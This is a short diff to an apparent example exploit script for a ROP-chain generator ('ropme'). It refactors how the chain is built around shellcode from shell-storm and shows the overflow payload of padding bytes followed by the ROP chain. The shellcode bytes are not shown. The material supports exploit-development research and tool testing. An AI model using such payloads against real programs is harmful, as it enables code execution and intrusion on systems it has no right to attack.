@@ -21,8 +21,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 )
 
 files = [(filename, None, 0)]
-goal_resolver = goal.create_from_arguments(files, [], [["shellcode_hex", binascii.hexlify(shellcode)]])
-rop = ropme.rop(files, goal_resolver)
+rop = ropme.rop(files, [], [["shellcode_hex", binascii.hexlify(shellcode)]], log_level = logging.DEBUG)
 
 payload = 'A'*512 + 'B'*8 + rop
 
